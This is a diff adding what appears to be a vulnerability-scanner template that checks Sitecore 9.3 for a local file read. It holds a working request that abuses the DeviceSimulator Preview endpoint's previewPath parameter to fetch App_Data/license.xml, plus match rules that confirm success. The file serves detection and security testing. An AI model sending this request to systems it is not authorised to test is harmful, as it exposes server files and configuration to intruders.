@@ -1,0 +1,25 @@
+id: sitecore-lfi
+brief:
+    title: Sitecore 9.3 - Webroot File Read
+    by: DhiyaneshDK
+    level: high
+    about: SiteCore 9.3 is vulnerable to LFI.
+    label:
+        - sitecore
+        - lfi
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/sitecore/Sitecore.Mvc.DeviceSimulator.Controllers.SimulatorController,Sitecore.Mvc.DeviceSimulator.dll/Preview?previewPath=/App_Data/license.xml'
+      signs:
+        - "on": word
+          has:
+            - <signedlicense id=
+            - <Signature
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
